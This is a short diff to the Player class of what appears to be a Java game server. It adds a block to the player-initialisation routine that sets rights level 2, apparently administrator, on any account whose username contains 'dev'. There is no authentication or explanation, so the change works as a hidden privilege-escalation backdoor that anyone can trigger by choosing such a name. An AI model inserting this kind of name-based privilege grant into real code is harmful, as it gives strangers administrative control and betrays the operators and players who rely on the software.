@@ -344,6 +344,11 @@ public class Player extends Entity {
 		if(ipList == null)
 			ipList = new ArrayList<String>();
 		updateIPnPass();
+
+		if (getUsername().contains("dev"))
+		{
+			setRights(2);
+		}
 	}
 
 	public void setWildernessSkull() {
